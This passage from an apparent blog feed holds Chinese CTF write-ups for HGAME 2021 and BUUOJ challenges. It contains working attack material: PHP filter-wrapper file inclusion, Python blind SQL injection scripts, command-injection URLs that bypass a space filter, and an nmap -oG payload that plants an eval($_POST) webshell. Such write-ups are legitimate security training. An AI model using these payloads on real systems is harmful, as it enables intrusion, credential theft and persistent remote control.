<span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$se</span><span class="token operator">.</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$se</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">TzoxNzoiRWVlZWVlZXZhbGxsbGxsbGwiOjE6e3M6MzoibXNnIjtPOjk6IkNhcmRzUG9vbCI6Mjp7czo1OiJjYXJkcyI7TjtzOjE1OiIAQ2FyZHNQb29sAGZpbGUiO3M6ODoiZmxhZy5waHAiO319.Y2Q1NjAzYWE3MjAxOWEwM2NjOWEwY2ZkNzk0ZmEwNzQ&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>hgame{XI-4Nd-n!AN-D0e5Nt_eX|5T~4t_ALL}</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h3><p>首先解一下base64：</p><p>GY4DMNZWGE3EINRVG5BDKNZWGUZTCNRTGMYDMRBWGU2UMNZUGMYDKRRUHA2DOMZUGRCDGMZVIYZTEMZQGMZDGMJXIQ======</p><p>解base32：</p><p>6867616D657B57653163306D655F74305F4847344D335F323032317D</p><p>解base16：</p><p>hgame{We1c0me_t0_HG4M3_2021}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h2&gt;&lt;h3 id=&quot;Hitchhiking-in-the-Galaxy&quot;&gt;&lt;a href=&quot;#Hitchhiking-in-the-Galax</summary>
      
    
    
    
    <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
    <category term="HGAME 2021" scheme="http://yoursite.com/tags/HGAME-2021/"/>
    
  </entry>
  
  <entry>
    <title>BUUOJ刷题1月第五周</title>
    <link href="http://yoursite.com/post/BUUOJ%E5%88%B7%E9%A2%981%E6%9C%88%E7%AC%AC%E5%9B%9B%E5%91%A8.html"/>
    <id>http://yoursite.com/post/BUUOJ%E5%88%B7%E9%A2%981%E6%9C%88%E7%AC%AC%E5%9B%9B%E5%91%A8.html</id>
    <published>2021-01-29T15:52:22.000Z</published>
    <updated>2021-06-28T14:57:56.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p><strong>考点：PHP伪协议</strong></p><p>这题上来就是一个选择，选择的内容是在url处category参数处，输入一个单引号，引发php报错。由此可以知道url传入的参数会先与”.php”进行拼接，然后使用include()来包含。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210122002428.png" alt="1"></p><p>这里想要直接输入flag和index都是不行的。但是php伪协议是可以使用的，所以利用php://来读取源码。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">strpos</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"woofers"</span> <span class="token punctuation">)</span> <span class="token operator">!==</span>  <span class="token keyword type-declaration">false</span> <span class="token operator">||</span> <span class="token class-name">strpos</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"meowers"</span> <span class="token punctuation">)</span> <span class="token operator">!==</span>  <span class="token keyword type-declaration">false</span> <span class="token operator">||</span> <span class="token class-name">strpos</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">include</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Sorry, we currently only support woofers and meowers."</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到代码恍然大悟，这就是为什么使用php://可以读index.php源码而直接传index是不行的了，因为第一次匹配到的位置的索引为0,不满足条件语句。</p><p>发现可以构造index/../flag，也可以构造多一个协议，例如<code>php://filter/read=convert.base64-encode/index/resource=flag</code></p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210122002416.png" alt="2"></p><p>解码base64得到：</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;!-- Can you read this flag? --&gt;&lt;?php &#x2F;&#x2F; flag&#123;afb95817-2aed-477a-94f4-7b9230bc4245&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h2><p><strong>考点：SQL注入(盲注)</strong></p><p>首先尝试注入，fuzz一下，发现’被过滤了。宽字节方式也不行，暂时卡住了，使用dirsearch扫描一下目录看看有无发现。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210129215747248.png" alt="image-20210129215747248"></p><p>check.php访问后只有一句You know，P3rh4ps needs a girl friend，就没有什么有用信息了。看一下robots.txt，发现有一个hint.txt。</p><p>得到了SQL查询语句<code>select * from users where username=&#39;$_POST[&quot;username&quot;]&#39; and password=&#39;$_POST[&quot;password&quot;]&#39;;</code>，因为<code>&#39;</code>已经被过滤了，无法使用了，所以如果想要把语句闭合，就需要利用password的第一个单引号，那么就要让username的第二个引号被转义，我们可以使用<code>\</code>，这个符号并没有被过滤。</p><p>此时SQL查询语句就变成了</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'\' and password='</span>$_POST<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>'<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个时候再在password处去构造 <code>or 1=1#</code>，就会变成：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'\' and password='</span><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">#'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是password位<code>=</code>被过滤了，改用&lt;，再password处构造<code>or 1&lt;2#</code></p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210129221001304.png" alt="image-20210129221001304"></p><p>显示BJD needs to be stronger。</p><p>使用<code>or 1&gt;2#</code>,则显示需要girl friend</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210129221254276.png" alt="image-20210129221254276"></p><p>报错盲注入，</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token comment"># url是随时更新的，具体的以做题时候的为准</span>url <span class="token operator">=</span> <span class="token string">'http://50a9254c-9687-46d1-b48c-adb3488702ba.node3.buuoj.cn/index.php'</span>cookie <span class="token operator">=</span> <span class="token string">'CooKie: UM_distinctid=17748ea81331be-00f63fed48a451-13e3563-144000-17748ea81343e8'</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin\\"</span><span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">""</span>        <span class="token punctuation">&#125;</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token comment"># 从可打印字符开始</span>    begin <span class="token operator">=</span> <span class="token number">32</span>    end <span class="token operator">=</span> <span class="token number">126</span>    mid <span class="token operator">=</span> <span class="token punctuation">(</span>begin <span class="token operator">+</span> end<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>    <span class="token keyword">while</span> begin <span class="token operator">&lt;</span> end<span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 延时操作</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>begin<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> end<span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"or ascii(substr(password,&#123;0&#125;,1))&lt;&#123;1&#125;#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token comment"># print(r.text)</span>        <span class="token keyword">if</span> <span class="token string">'girl friend'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>           <span class="token comment"># 布尔判断成立的时候的情况</span>            begin <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>            mid <span class="token operator">=</span> <span class="token punctuation">(</span>begin <span class="token operator">+</span> end<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            end <span class="token operator">=</span> mid            mid <span class="token operator">=</span> <span class="token punctuation">(</span>begin <span class="token operator">+</span> end<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token comment"># 退出使的判断会多做一次，导致mid比实际的要大1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    i <span class="token operator">+=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以得到密码为OhyOuFOuNdit</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210129223838211.png" alt="image-20210129223838211"></p><p>使用获取的密码登陆即可。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210129223912149.png" alt="image-20210129223912149"></p><h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p><strong>看点：HTTP Header、PHP弱类型</strong></p><p>开局就报错了：</p><pre class="line-numbers language-none"><code class="language-none">Hack meWarning: Cannot modify header information - headers already sent by (output started at &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php:3) in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>产生这种错误的原因是发送或修改HTTP头信息的方法在有输出后才被调用。为什么会产生这种错误呢？因为http response总是先发送http header 然后才是html信息。所以PHP也必须先把头信息发出给web服务器，而且只能发送一次，再次之后就不允许再修改头信息了。这里的输出可以是<code>print</code>、<code>echo</code>、<code>&lt;html&gt;</code>,一旦有输出信息，http header就已经发送，所以再要更改就会产生报错。</p><p>通过上面的警告，line4是指向调用header()失败的脚本行数。而先于header()的输出实在index.php的第3行。这里就是我们需要去找的过早输出的点。从报错前有输出hack me，可以猜测，第3行可能是使用了echo。</p><p>dirsearch扫描目录，访问一下robots.txt看看，发现一个fAke_f1agggg.php，内如其名一个假flag，但是在假flag的这个http header发现了一个fl4g.php</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210130174256976.png" alt="image-20210130174256976"></p><p>访问fl4g.php，依旧是PHP警告，也是和index.php一样的问题，但是这次有源码，好像是让我们闯关。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//level 1</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2020</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">2021</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"鍘婚潪娲插惂"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里要求num必须小于2020，num+1要大于2021。这个肯定是涉及到弱类型绕过问题。intval()函数用于获取变量的整数值，通过使用指定的进制base转换(默认是十进制)，返回变量var的integer数值。intval()不能用于object，否则会产生E_NOTICE错误并且返回1。</p><p><strong>返回值</strong></p><p>成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。</p><p>最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p><p>字符串有可能返回 0，虽然取决于字符串最左侧的字符。</p><p>由于靶机是php5的环境，所以可以使用2e4来绕过，2e4会被解析为2，而2e4+1被解析为20001</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210130184012985.png" alt="image-20210130184012985"></p><p>成功绕过第一关。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//level 2</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token variable">$md5</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token keyword">echo</span> <span class="token string double-quoted-string">"鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.&lt;/br>"</span><span class="token punctuation">;</span>   <span class="token keyword">else</span>       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"鍘婚潪娲插惂"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第二关是md5的弱类型比较，重点是需要原来的值的md5要==原来的值，这个问题就是0e开头的字符串md5()后还是0e开头。这就是双md5碰撞问题。</p><p>找了一圈，发现了一个0e18bb6e1d5c2e19b63898aeed6b37ea</p><p>他的md5还是0e0a710a092113dd5ec9dd47d4d7b86f</p><p>所以使用payload:</p><p><code>md5=0e18bb6e1d5c2e19b63898aeed6b37ea</code>,可惜本地测试一下发现比较不成功，后来又发现一个payload:<code>0e215962017</code><br>最后一关获取flag</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//get flag</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">,</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"wctf2020"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"蹇埌闈炴床浜�"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"鍘婚潪娲插惂"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了空格，所以不能直接使用空格了，改用$IFS$1,cat不可用，改用tac命令。</p><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;00d5f171-fda9-4cfb-8d25-c9bceeafc667.node3.buuoj.cn&#x2F;fl4g.php?num&#x3D;2e5&amp;md5&#x3D;0e215962017&amp;get_flag&#x3D;tac$IFS$1fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p><strong>考点：nmap写webshell</strong></p><p>这里很明确的提到了nmap，直接去查看了一下nmap的中文手册，发现有很多Output选项，所以可以尝试用output选项来写webshell。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Nmap输出格式-oN &lt;filespec&gt; (标准输出)要求将标准输出直接写入指定 的文件。如上所述，这个格式与交互式输出 略有不同。-oX &lt;filespec&gt; (XML输出)要求XML输出直接写入指定 的文件。Nmap包含了一个文档类型定义(DTD)，使XML解析器有效地 进行XML输出。这主要是为了程序应用，同时也可以协助人工解释 Nmap的XML输出。DTD定义了合法的格式元素，列举可使用的属性和 值。最新的版本可在 http:&#x2F;&#x2F;www.insecure.org&#x2F;nmap&#x2F;data&#x2F;nmap.dtd获取。XML提供了可供软件解析的稳定格式输出，主要的计算机 语言都提供了免费的XML解析器，如C&#x2F;C++，Perl，Python和Java。 针对这些语言有一些捆绑代码用于处理Nmap的输出和特定的执行程序。 例如perl CPAN中的Nmap::Scanner 和Nmap::Parser。 对几乎所有与Nmap有接口的主要应用来说，XML是首选的格式。XML输出引用了一个XSL样式表，用于格式化输出结果，类似于 HTML。最方便的方法是将XML输出加载到一个Web浏览器，如Firefox 或IE。由于nmap.xsl文件的绝对 路径，因此通常只能在运行了Nmap的机器上工作(或类似配置的机器)。 类似于任何支持Web机器的HTML文件，--stylesheet 选项可用于建立可移植的XML文件。-oS &lt;filespec&gt; (ScRipT KIdd|3 oUTpuT)脚本小子输出类似于交互工具输出，这是一个事后处理，适合于 &#39;l33t HaXXorZ， 由于原来全都是大写的Nmap输出。这个选项和脚本小子开了玩笑，看上去似乎是为了 “帮助他们”。-oG &lt;filespec&gt; (Grep输出)这种方式最后介绍，因为不建议使用。XML输格式很强大，便于有经验 的用户使用。XML是一种标准，由许多解析器构成，而Grep输届更简化。XML 是可扩展的，以支持新发布的Nmap特点。使用Grep输出的目的是忽略这些 特点，因为没有足够的空间。然面，Grep输出仍然很常使用。它是一种简单格式，每行一个主机，可以 通过UNIX工具(如grep、awk、cut、sed、diff)和Perl方便地查找和分解。常可 用于在命令行上进行一次性测式。查找ssh端口打开或运行Sloaris的主机，只需 要一个简单的grep主机说明，使用通道并通过awk或cut命令打印所需的域。Grep输出可以包含注释(每行由#号开始)。每行由6个标记的域组成，由制表符及 冒号分隔。这些域有主机，端口， 协议，忽略状态， 操作系统，序列号， IPID和状态。这些域中最重要的是Ports，它提供 了所关注的端口的细节，端口项由逗号分隔。每个端口项代表一个所关注的端口， 每个子域由&#x2F;分隔。这些子域有：端口号， 状态，协议， 拥有者，服务， SunRPCinfo和版本信息。对于XML输出，本手册无法列举所有的格式，有关Nmap Grep输出的更详细信息可 查阅http:&#x2F;&#x2F;www.unspecific.com&#x2F;nmap-oG-output。-oA &lt;basename&gt; (输出至所有格式)为使用方便，利用-oA&lt;basename&gt;选项 可将扫描结果以标准格式、XML格式和Grep格式一次性输出。分别存放在 &lt;basename&gt;.nmap，&lt;basename&gt;.xml和 &lt;basename&gt;.gnmap文件中。也可以在文件名前 指定目录名，如在UNIX中，使用~&#x2F;nmaplogs&#x2F;foocorp&#x2F;， 在Window中，使用c:\hacking\sco on Windows。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload:</p><p><code>127.0.0.1 | &lt;?php eval($_POST[&#39;alan&#39;]);?&gt; -oG alan.php</code> </p><p>显示hacker，发现php被过滤，只要出现php就会出现hacker</p><p>尝试使用phtml，发现可以使用。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210131111426880.png" alt="image-20210131111426880"></p><p>被转义了，说明存在转义函数，那就让后面的内容称为一个字符串，这样转义时转义的时单引号。</p><pre class="line-numbers language-none"><code class="language-none">127.0.0.1 | &#39; &lt;?&#x3D;eval($_POST[&#39;alan&#39;]);?&gt; -oG alan.phtml &#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>蚁剑连接这里在/flag可以获取flag，在index.php中可以看到使用了两个过滤函数，escapeshellarg()、escapeshellcmd()</p><h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p><strong>考点：SQL注入异或</strong></p><p>注入点按照提示就是id处了，然后过滤了很多东西，例如空格、and等等。可以使用异或来做，</p><p>id=1^1是click，id=1^0是error，上脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token comment"># url是随时更新的，具体的以做题时候的为准</span><span class="token comment"># url = 'http://bdd094c1-1f95-40ae-a983-e0744076a014.node3.buuoj.cn/search.php'</span>cookie <span class="token operator">=</span> <span class="token string">'CooKie: UM_distinctid=17748ea81331be-00f63fed48a451-13e3563-144000-17748ea81343e8'</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token comment"># 从可打印字符开始</span>    begin <span class="token operator">=</span> <span class="token number">32</span>    end <span class="token operator">=</span> <span class="token number">126</span>    mid <span class="token operator">=</span> <span class="token punctuation">(</span>begin <span class="token operator">+</span> end<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>    <span class="token keyword">while</span> begin <span class="token operator">&lt;</span> end<span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 延时操作</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>begin<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> end<span class="token punctuation">)</span>        url <span class="token operator">=</span> <span class="token string">"http://bdd094c1-1f95-40ae-a983-e0744076a014.node3.buuoj.cn/search.php?id=1^(ascii(substr(database(),&#123;0&#125;,1))&lt;&#123;1&#125;)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>        <span class="token comment"># url 